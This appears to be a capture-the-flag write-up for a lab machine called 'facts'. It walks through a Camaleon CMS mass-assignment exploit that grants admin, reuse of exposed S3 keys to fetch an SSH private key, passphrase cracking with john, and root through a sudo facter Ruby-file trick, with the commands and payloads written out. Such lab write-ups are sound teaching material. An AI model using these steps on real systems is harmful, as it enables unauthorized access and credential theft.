## Scanning
Begin by scanning with `nmap -sCV <IP address> -oN scans-facts`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We will notice that there's an open port of 80, and the DNS resolved to `facts.htb`. Add this line on your `/etc/hosts`'
```
<IP address>      facts.htb
```

## Enumeration
We see this landing page, and nothing much to explore
![](../assets/facts/Pasted%20image%2020260205152812.png)
So we fuzz for any directories found. Surprisingly enough, we found something interesting.
![](../assets/facts/Pasted%20image%2020260205152928.png)
We navigate to `/admin/login`, we have the ability to create an account. Create an account of your choice and login, though it will be a normal user as of the moment.
![](../assets/facts/Pasted%20image%2020260205153105.png)
Upon successful login, it welcomes you to the admin panel. But we're not admin yet.
![](../assets/facts/Pasted%20image%2020260205153225.png)

## Foothold
Upon looking at the footer, there is an issue when a user tries to change its password, an additional parameter will be added and the user will be elevated to admin. More info about the vulnerability by this source code: [Fix updated_ajax action to permit only legit params](https://github.com/owen2345/camaleon-cms/commit/97f00aedbbb90d7e762b60b2b140e22021014bf2)
![](../assets/facts/Pasted%20image%2020260205153943.png)
Upon looking the line below, accepts any parameter.
```rb
 @user.update(params.require(:password).permit!)
```
The intended way to send the request would look like this
```json
{
  "password": {
    "password": "newpass123",
    "password_confirmation": "newpass123"
  }
}
```
But an attacker could add a role something like this
```json
{
  "password": {
    "password": "newpass123",
    "password_confirmation": "newpass123",
    "role": "admin"  // ATTACKER ADDS THIS
  }
}
```
So if you update your password, and append the payload of `&password%5Brole%5D=admin`
![](../assets/facts/Pasted%20image%2020260205155342.png)
![](../assets/facts/Pasted%20image%2020260205155441.png)
Then **Rails** would interpret it as something like this
```json
params = {
  password: {
    role: "admin"
  }
}
```
Which will then elevate your status as **admin** and you get to access other features
![](../assets/facts/Pasted%20image%2020260205155542.png)

Proceed to navigate on **Settings** -> **General sites** -> **Filesystem Settings** it will reveal **Access Key** and **Secret Key** of an **S3 Bucket**
![](../assets/facts/Pasted%20image%2020260205155817.png)
Take note that the S3 bucket endpoint is running on `localhost:54321`

## MINIO Client
We will use the tool **MINIO** to interact with the S3 Bucket. Install it through this link [Installing MINIO](https://docs.min.io/enterprise/aistor-object-store/reference/cli/).
Then set the alias pointing to the S3 Bucket server
```
mc alias set facts http://facts.htb:54321 <ACCESS KEY> <SECRET KEY>
```
Then do `ls` command to view the files
```bash
 mc ls facts                                                                                            
[2025-09-11 08:06:52 EDT]     0B internal/
[2025-09-11 08:06:52 EDT]     0B randomfacts/
```
We can retrieve the `.ssh` **id_ed25519** machine and try to crack this with john using the wordlist of `rockyou.txt`
```bash
mc ls facts/internal/.ssh
[2026-02-05 02:19:06 EST]    82B STANDARD authorized_keys
[2026-02-05 02:19:06 EST]   464B STANDARD id_ed25519
```
```bash
mc get facts/internal/.ssh/id_ed25519 .
```
Using `ssh2john` we convert it to a format that the tool `john` would accept before cracking
```bash
ssh2john id_ed25519 > id.hash
john --wordlist=~/Tools/wordlists/rockyou.txt id.hash
<redacted_password>      (id_ed25519) 
```
Now that we have the password, let's find what is the user for the `ssh`. It says `The key has comment 'trivia@facts.htb` so that is the user that we'll use.
```
ssh-keygen -p -f id_ed25519
```
![](../assets/facts/Pasted%20image%2020260205161258.png)
Set the permission that only you can access it
```
chmod 600 id_ed25519
ssh trivia@facts.htb -i id_ed25519
```
Then you will be logged in as **trivia**
## User & Root Flag
The **user** flag is not inside trivia's directory. Instead it's on the other user if you try to look at the `/home` directory. We need to enumerate where or what things that trivia could run as `sudo`. We issue the command `sudo -l`:
```
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
The user **trivia** can run `facter`. Luckily, there is a [GTFOBins](https://gtfobins.org/gtfobins/facter/) technique that exists. As a non-privileged user, we can run `facter` to elevate our previlege to `root` by telling the tool `facter` to point on our directory that has a **Ruby** file in it, since `facter` is made in Ruby.

We start by making a directory inside `/tmp`. Then, make a **Ruby** file that execute `/bin/bash` since trivia can run as sudo using `facter`. If `facter` finds the file in our custom directory it will elevate our privilege.
```
cd /tmp
mkdir /tmp/elevate
cd elevate
echo 'exec "/bin/sh"' > priv.rb
sudo /usr/bin/facter --custom-dir=/tmp/elevate/
```
![](../assets/facts/Pasted%20image%2020260205162526.png)
Now you can retrieve the user flag at `/home/william/user.txt` and root flag at `/root/root.txt`.